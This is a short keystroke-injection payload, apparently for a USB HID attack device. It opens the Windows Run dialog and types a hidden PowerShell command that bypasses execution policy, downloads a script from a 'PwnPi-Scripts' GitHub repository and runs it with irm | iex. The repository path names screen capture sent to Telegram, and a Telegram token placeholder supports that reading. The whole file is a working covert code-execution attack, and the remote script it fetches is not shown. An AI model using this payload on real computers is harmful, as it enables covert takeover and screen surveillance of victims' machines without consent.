

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigew0rm/PwnPi-Scripts/main/Fast-Execution/Screen-to-Telegram/main.ps1 | iex");
delay(500);
press("ENTER");
